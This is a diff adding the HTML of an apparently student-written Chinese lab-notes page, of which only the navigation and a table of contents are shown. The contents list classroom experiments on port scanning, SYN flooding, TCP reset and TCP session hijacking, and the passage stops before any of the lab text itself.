@@ -1,0 +1,1915 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A personal computer science knowledge tree for systems, networking, cryptography, and engineering practice.">
+      
+      
+      
+        <link rel="canonical" href="https://infinitepwn.github.io/cs-knowledge-tree/notes/cybersecurity-lab/lab3/lab3/">
+      
+      
+      
+      
+      <link rel="icon" href="../../../../assets/logo.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.49">
+    
+    
+      
+        <title>lab3 - CS Knowledge Tree</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lab3" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../.." title="CS Knowledge Tree" class="md-header__button md-logo" aria-label="CS Knowledge Tree" data-md-component="logo">
+      
+  <img src="../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CS Knowledge Tree
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              lab3
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="cyan"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/infinitepwn/cs-knowledge-tree" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    infinitepwn/cs-knowledge-tree
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../roadmap/" class="md-tabs__link">
+        
+  
+    
+  
+  学习路线
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../knowledge/computer-systems/" class="md-tabs__link">
+          
+  
+  知识树
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../stacks/systems/" class="md-tabs__link">
+          
+  
+  技术栈
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../courses/" class="md-tabs__link">
+          
+  
+  课程仓库
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../" class="md-tabs__link">
+          
+  
+  课程笔记
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="CS Knowledge Tree" class="md-nav__button md-logo" aria-label="CS Knowledge Tree" data-md-component="logo">
+      
+  <img src="../../../../assets/logo.svg" alt="logo">
+
+    </a>
+    CS Knowledge Tree
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/infinitepwn/cs-knowledge-tree" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    infinitepwn/cs-knowledge-tree
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    首页
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../roadmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    学习路线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    知识树
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            知识树
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../knowledge/computer-systems/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../knowledge/networking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机网络
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../knowledge/cybersecurity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    密码学与安全
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../knowledge/programming/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    编程与工程实践
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    技术栈
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            技术栈
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../stacks/systems/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    系统方向
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../stacks/security/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    安全方向
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../stacks/backend/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    后端方向
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../stacks/embedded/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    嵌入式方向
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    课程仓库
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            课程仓库
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../courses/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    总览
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../courses/computer-networking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机网络
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../courses/operating-system/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    操作系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../courses/cryptography/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    密码学引论
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../courses/computer-systems/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机系统原理
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    课程笔记
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            课程笔记
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    总览
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../computer-networking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机网络
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../operating-system/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    操作系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cryptography/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    密码学引论
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../computer-systems/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机系统原理
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    算法设计与分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cryptanalysis/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    密码分析学
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machine-learning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    机器学习
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cybersecurity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络安全
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络安全实验
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../finite-field/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    有限域
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../rag/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RAG
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      实验1：资产探查与端口扫描
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实验1：资产探查与端口扫描">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      部署网络拓扑
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hping3" class="md-nav__link">
+    <span class="md-ellipsis">
+      hping3
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="hping3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#icmp" class="md-nav__link">
+    <span class="md-ellipsis">
+      ICMP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ICMP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hping3icmp-echo-ping192168460" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用hping3的ICMP Echo 请求（通常被称为ping请求）进行探测，这里以192.168.4.60为例。
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hping3tcpsynackpushfinrst" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用hping3发送多种类型TCP包进行主机探测，包括SYN、ACK、PUSH、FIN、RST等类型。
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hping3udp" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用hping3的udp选项进行探测；
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Nmap">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap1921684024" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用Nmap主机探测功能获取192.168.4.0/24存活的主机名单。
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nmap1921684105" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用 Nmap对服务器（192.168.4.105）开展全端口扫描，获取端口开放状态，并判断端口对应的服务及版本
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2syn" class="md-nav__link">
+    <span class="md-ellipsis">
+      实验2：SYN洪泛攻击与防范
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实验2：SYN洪泛攻击与防范">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络拓扑
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络拓扑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scapyscapytcp-syn" class="md-nav__link">
+    <span class="md-ellipsis">
+      攻击者主机上提供Scapy环境，实验者需编辑Scapy脚本构造TCP SYN数据包
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcp-syn_recv-syn-syn-ack-ack-tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      在受害者主机上观察 TCP 的半连接状态，SYN_RECV 表示已接收到客户发送的 SYN 报⽂,并回复了 SYN-ACK 报⽂，正在等待客户端发送 ACK 报⽂建⽴ TCP 连接的状态。
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      实验 3：TCP 连接重置
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实验 3：TCP 连接重置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络拓扑
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络拓扑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      配置流量镜像
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      实验 4：TCP会话劫持
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实验 4：TCP会话劫持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      网络拓扑
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="网络拓扑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#user-telnetserver" class="md-nav__link">
+    <span class="md-ellipsis">
+      User Telnet登录server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacker" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacker编写攻击脚本
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attackernc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacker用nc监听
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attackershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacker拿到反弹shell
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+    <a href="https://github.com/infinitepwn/cs-knowledge-tree/edit/main/docs/notes/cybersecurity-lab/lab3/lab3.md" title="编辑此页" class="md-content__button md-icon">
+      
